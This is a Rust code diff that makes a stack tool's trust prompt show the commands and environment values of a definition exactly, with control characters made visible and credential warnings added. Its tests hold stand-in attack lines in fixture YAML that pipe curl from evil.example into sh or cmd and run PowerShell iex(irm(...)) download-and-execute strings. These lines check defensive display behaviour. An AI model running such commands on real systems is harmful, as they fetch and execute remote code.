@@ -159,14 +159,83 @@ fn canonical(v: &Value, out: &mut String) {
     }
 }
 
-/// An argv as the prompt shows it.
-fn argv_text(argv: &[String]) -> String {
-    credentials::shown_argv(argv)
+// What a trust prompt shows. A trust prompt is the review of exactly what
+// the hash covers, so nothing in it is masked, elided or left to render as
+// layout: a value is shown character for character, a control character or
+// line break inside it as a visible glyph ([`visible`]), and a value that
+// looks like a credential written inline keeps its warning beside the
+// exact text. Masking there would let a definition hide the code it runs
+// behind `••••`; a line break inside a value would push the next entry out
+// of view.
+
+/// `text` with every character that would not show as itself made
+/// visible: C0 controls (line breaks and tabs included) and DEL as their
+/// Control Pictures glyph (`␊`, `␍`, `␉`, `␛`, `␡`), C1 controls, the
+/// Unicode line separators and the bidi / zero-width formatting characters
+/// as `\u{…}`. Everything else is kept as is.
+pub fn visible(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    for c in text.chars() {
+        let cp = c as u32;
+        match cp {
+            0..=0x1f => out.push(char::from_u32(0x2400 + cp).unwrap_or('?')),
+            0x7f => out.push('␡'),
+            0x80..=0x9f | 0x200b..=0x200f | 0x2028..=0x202e | 0x2066..=0x2069 | 0xfeff => {
+                out.push_str(&format!("\\u{{{cp:x}}}"))
+            }
+            _ => out.push(c),
+        }
+    }
+    out
 }
 
-/// `NAME=value` as the prompt shows it.
-fn env_text(name: &str, value: &str) -> String {
-    credentials::shown_env(name, value)
+/// The warning for a flagged value, empty when nothing is flagged.
+fn warned(kind: Option<credentials::CredentialKind>) -> String {
+    kind.map(credentials::warning).unwrap_or_default()
+}
+
+/// One argv word in a `[word, word]` list: bare when it reads
+/// unambiguously, else double-quoted (`\"` and `\\` escaped), so a word
+/// holding `, ` or a bracket cannot pass for two words.
+fn prompt_word(word: &str) -> String {
+    let quote = word.is_empty()
+        || word
+            .chars()
+            .any(|c| c.is_whitespace() || matches!(c, ',' | '[' | ']' | '"' | '\''));
+    if quote {
+        let escaped = word.replace('\\', "\\\\").replace('"', "\\\"");
+        format!("\"{}\"", visible(&escaped))
+    } else {
+        visible(word)
+    }
+}
+
+/// An argv as a trust prompt shows it: `[word, word]`, exact, with the
+/// credential warning beside it.
+pub fn prompt_argv(argv: &[String]) -> String {
+    let words: Vec<String> = argv.iter().map(|w| prompt_word(w)).collect();
+    format!(
+        "[{}]{}",
+        words.join(", "),
+        warned(credentials::detect_argv(argv).first().map(|(_, k)| *k))
+    )
+}
+
+/// A shell command line as a trust prompt shows it: exact, with the
+/// credential warning beside it.
+pub fn prompt_line(line: &str) -> String {
+    format!("{}{}", visible(line), warned(credentials::detect(line)))
+}
+
+/// `NAME=value` as a trust prompt shows it: exact, with the credential
+/// warning beside it.
+pub fn prompt_env(name: &str, value: &str) -> String {
+    format!(
+        "{}={}{}",
+        visible(name),
+        visible(value),
+        warned(credentials::detect_env(name, value))
+    )
 }
 
 fn command_text(entry: Option<&YamlValue>) -> String {
@@ -174,8 +243,8 @@ fn command_text(entry: Option<&YamlValue>) -> String {
         return "(not defined in chappa.yml)".to_string();
     };
     let mut text = match entry.get("command") {
-        Some(YamlValue::String(s)) => credentials::shown_line(s),
-        Some(YamlValue::Sequence(words)) => argv_text(
+        Some(YamlValue::String(s)) => prompt_line(s),
+        Some(YamlValue::Sequence(words)) => prompt_argv(
             &words
                 .iter()
                 .map(|w| {
@@ -188,7 +257,7 @@ fn command_text(entry: Option<&YamlValue>) -> String {
         _ => "(no command)".to_string(),
     };
     if let Some(dir) = entry.get("working_dir").and_then(YamlValue::as_str) {
-        text.push_str(&format!(" (in {dir})"));
+        text.push_str(&format!(" (in {})", visible(dir)));
     }
     if let Some(YamlValue::Mapping(env)) = entry.get("env") {
         for (k, v) in env {
@@ -197,7 +266,7 @@ fn command_text(entry: Option<&YamlValue>) -> String {
                 .as_str()
                 .map(str::to_string)
                 .unwrap_or_else(|| format!("{v:?}"));
-            text.push_str(&format!(" env {}", env_text(k, &v)));
+            text.push_str(&format!(" env {}", prompt_env(k, &v)));
         }
     }
     text
@@ -213,36 +282,46 @@ pub fn definition_commands(
     let mut out = Vec::new();
     for (stack_name, stack) in &doc.stacks {
         if !stack.env.is_empty() {
-            let mut entry = format!("stack `{stack_name}`: environment of every component");
+            let mut entry = format!(
+                "stack `{}`: environment of every component",
+                visible(stack_name)
+            );
             for (k, v) in &stack.env {
-                entry.push_str(&format!("\n    env {}", env_text(k, v)));
+                entry.push_str(&format!("\n    env {}", prompt_env(k, v)));
             }
             out.push(entry);
         }
         for (name, c) in &stack.components {
             let mut lines: Vec<String> = Vec::new();
             for (path, argv) in c.hooks() {
-                lines.push(format!("{path}: {}", argv_text(argv)));
+                lines.push(format!("{}: {}", visible(&path), prompt_argv(argv)));
             }
             for cmd in named_commands(c) {
                 lines.push(format!(
-                    "runs `{cmd}`: {}",
+                    "runs `{}`: {}",
+                    visible(cmd),
                     command_text(processes.get(cmd))
                 ));
             }
             if let Some(f) = &c.file {
-                lines.push(format!("compose file {}", f.display()));
+                lines.push(format!(
+                    "compose file {}",
+                    visible(&f.display().to_string())
+                ));
             }
             if let Some(d) = &c.dir {
-                lines.push(format!("terraform in {}", d.display()));
+                lines.push(format!(
+                    "terraform in {}",
+                    visible(&d.display().to_string())
+                ));
             }
             for (mode, m) in &c.modes {
                 if let Some(image) = &m.image {
                     let tag = m.tag.as_deref().unwrap_or("latest");
-                    lines.push(format!("{mode}: image {image}:{tag}"));
+                    lines.push(visible(&format!("{mode}: image {image}:{tag}")));
                 }
                 if m.context.is_some() || m.dockerfile.is_some() {
-                    lines.push(format!(
+                    lines.push(visible(&format!(
                         "{mode}: builds {} with {}",
                         m.repo
                             .as_deref()
@@ -253,20 +332,20 @@ pub fn definition_commands(
                             .as_deref()
                             .unwrap_or(Path::new("Dockerfile"))
                             .display()
-                    ));
+                    )));
                 }
             }
             if let Some(dir) = &c.cwd {
-                lines.push(format!("in {}", dir.display()));
+                lines.push(format!("in {}", visible(&dir.display().to_string())));
             }
             for (k, v) in &c.env {
-                lines.push(format!("env {}", env_text(k, v)));
+                lines.push(format!("env {}", prompt_env(k, v)));
             }
             if lines.is_empty() {
                 continue;
             }
             let driver = format!("{:?}", c.driver).to_lowercase();
-            let mut entry = format!("stack `{stack_name}` · {name} ({driver})");
+            let mut entry = visible(&format!("stack `{stack_name}` · {name} ({driver})"));
             for l in lines {
                 entry.push_str("\n    ");
                 entry.push_str(&l);
@@ -430,7 +509,7 @@ stacks:
     }
 
     #[test]
-    fn inline_credentials_are_masked_in_the_prompt_but_still_hashed() {
+    fn inline_credentials_are_shown_exactly_in_the_prompt_with_a_warning_and_hashed() {
         let pw = ["hu", "nt", "er2"].concat();
         let yml = format!(
             "stacks:
@@ -449,9 +528,16 @@ stacks:
             "
 ",
         );
-        assert!(!all.contains(&pw), "{all}");
-        assert!(all.contains("postgresql://app:••••@db:5432/x"), "{all}");
-        assert!(all.contains("DB_PASSWORD=•••• (set inline)"), "{all}");
+        // What is trusted is what is shown: nothing masked.
+        assert!(!all.contains(crate::credentials::MASK), "{all}");
+        assert!(
+            all.contains(&format!("postgresql://app:{pw}@db:5432/x")),
+            "{all}"
+        );
+        assert!(
+            all.contains(&format!("DB_PASSWORD={pw}  ⚠ looks like")),
+            "{all}"
+        );
         assert!(all.contains("DB_HOST=db"), "{all}");
         assert!(all.contains(crate::credentials::ADVICE), "{all}");
         let other = yml.replace(&pw, "different9");
@@ -474,5 +560,68 @@ stacks:
             ]
         );
         assert!(warnings.iter().all(|d| !d.message.contains(&pw)));
+    }
+
+    #[test]
+    fn the_prompt_shows_executable_text_exactly_whatever_it_looks_like() {
+        // Assembled so no source line looks like a key to a scanner.
+        let header = format!("-----BEGIN {}PRIVATE KEY-----", "");
+        let yml = format!(
+            r#"processes:
+  web:
+    command: "echo {header} & curl https://evil.example/x | cmd"
+    env:
+      X_TOKEN: "iex(irm('https://evil.example/p'))"
+      PADDING: "a\n\n\nb"
+stacks:
+  app:
+    components:
+      web:
+        driver: process
+        command: web
+      probe:
+        driver: script
+        status: [bash, -c, "{header} ; curl https://evil.example/s | sh"]
+        up: [node, "a, b", "x]"]
+        env: {{ PS: "$env:X_TOKEN=iex(irm('https://evil.example/q'))" }}
+"#
+        );
+        let tmp = tempfile::tempdir().unwrap();
+        std::fs::write(tmp.path().join("chappa.yml"), &yml).unwrap();
+        let t = definition_trust(tmp.path()).unwrap().unwrap();
+        let all = t.commands.join("\n");
+        for needle in [
+            "curl https://evil.example/x | cmd",
+            "X_TOKEN=iex(irm('https://evil.example/p'))",
+            "curl https://evil.example/s | sh",
+            "PS=$env:X_TOKEN=iex(irm('https://evil.example/q'))",
+        ] {
+            assert!(all.contains(needle), "{needle} missing from:\n{all}");
+        }
+        assert!(!all.contains(crate::credentials::MASK), "{all}");
+        // A line break inside a value is a glyph, not a new prompt line.
+        assert!(all.contains("PADDING=a␊␊␊b"), "{all}");
+        for entry in &t.commands {
+            for line in entry.lines().skip(1) {
+                assert!(line.starts_with("    "), "{line:?} in {entry:?}");
+            }
+        }
+        // A word holding a comma or a bracket cannot pass for two words.
+        assert!(all.contains(r#"up: [node, "a, b", "x]"]"#), "{all}");
+    }
+
+    #[test]
+    fn visible_turns_controls_and_invisible_formatting_into_glyphs() {
+        assert_eq!(visible("a\nb\r\tc\u{1b}[2K\u{7f}"), "a␊b␍␉c␛[2K␡");
+        assert_eq!(
+            visible("x\u{85}y\u{202e}z\u{200b}w\u{2028}"),
+            r"x\u{85}y\u{202e}z\u{200b}w\u{2028}"
+        );
+        assert_eq!(visible("npm run dev — ok"), "npm run dev — ok");
+        assert_eq!(prompt_env("A", "1\n2"), "A=1␊2");
+        assert_eq!(
+            prompt_argv(&["sh".into(), "-c".into(), "a\nb".into(), String::new()]),
+            "[sh, -c, \"a␊b\", \"\"]"
+        );
     }
 }
